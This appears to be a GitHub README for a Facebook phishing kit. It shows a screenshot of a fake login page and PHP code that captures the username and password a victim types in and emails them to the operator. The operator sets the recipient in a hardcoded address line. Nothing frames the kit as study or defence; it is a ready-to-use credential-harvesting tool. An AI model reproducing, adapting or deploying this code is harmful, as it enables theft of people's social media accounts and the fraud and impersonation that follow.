# Facebook-Phishing
Facebook Phishing { UI &amp;  [fish (User_Name &amp; Password)] Send Your email address }
<br><br>
![ui01](https://user-images.githubusercontent.com/77710282/158953984-17708128-2cff-445f-88c9-0f6daf64e9ee.PNG)


## PHP MAIL FUNCTION
```
<?php 
	
	//php STRAT
	if ( isset($_POST['submit']) )
	
	{
		$email		= $_POST['email'];
		$subject	= $_POST['subject'];
  
		$to	 		  = 'dhjptharindu@gmail.com'; // your email address
		$mail_subject = 'FACEBOOK PHISHING ';
		$email_body   = "<h2> FISH FACEBOOK DETAILS: </h2><br><br>";
                $email_body   .= "<b>USER NAME:</b> {$subject} <br>";
		$email_body   .= "<b>PASSWORD:</b> {$email} <br>";
		$header       = "From: {$email}\r\nContent-Type: text/html;";

		$send_mail_result = mail($to, $mail_subject, $email_body, $header);
	}
?>
```
## YOU MAIL Mail  
`
$to	 		  = 'dhjptharindu@gmail.com'; // your email address
`
